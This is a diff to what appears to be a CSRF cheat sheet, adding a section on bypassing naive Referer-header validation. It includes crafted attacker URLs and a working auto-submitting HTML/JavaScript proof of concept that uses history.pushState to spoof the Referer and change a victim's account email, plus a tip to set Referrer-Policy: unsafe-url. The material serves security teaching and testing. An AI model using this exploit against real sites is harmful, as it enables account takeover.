@@ -19,7 +19,8 @@ Cross-site request forgery (also known as CSRF) is a web security vulnerability 
     - [Site vs origin](#site-vs-origin)
     - [bypass SameSite](#bypass-samesite)
 - [Bypassing Referer-based CSRF defenses](#bypassing-referer-based-csrf-defenses)
-    -[Validation of Referer depends on header being present](#validation-of-referer-depends-on-header-being-present)
+    - [Validation of Referer depends on header being present](#validation-of-referer-depends-on-header-being-present)
+    - [Validation of Referer can be circumvented](#validation-of-referer-can-be-circumvented)
 
 ## How does it work ? 
 
@@ -226,6 +227,39 @@ In this situation, an attacker can craft their CSRF exploit in a way that causes
     </body>
 </html>
 ```
+
+### Validation of Referer can be circumvented
+
+Validation of Referer can be circumvented
+Some applications validate the Referer header in a naive way that can be bypassed. For example, if the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain:
+
+`http://vulnerable-website.com.attacker-website.com/csrf-attack`
+
+Likewise, if the application simply validates that the Referer contains its own domain name, then the attacker can place the required value elsewhere in the URL:
+
+`http://attacker-website.com/csrf-attack?vulnerable-website.com`
+
+for example:
+
+```html
+<html>
+    <body>
+        <script>
+        history.pushState("", "", "/?vuln-site.net")
+        </script>
+        <form action="https://vuln-site.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="pwnd@evil-user.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+```
+
+As you can see, my exploit-server now change is url with `history.pushState("", "", "/?vuln-site.net")` to bypass referrer header and provide him the string `vuln-site.net` inside the URL.
+
+:warning: If the explit doesnt work, make sur passing `Referrer-Policy: unsafe-url` this headet to you exploit server to not strp the referrer !
 
 ---
 
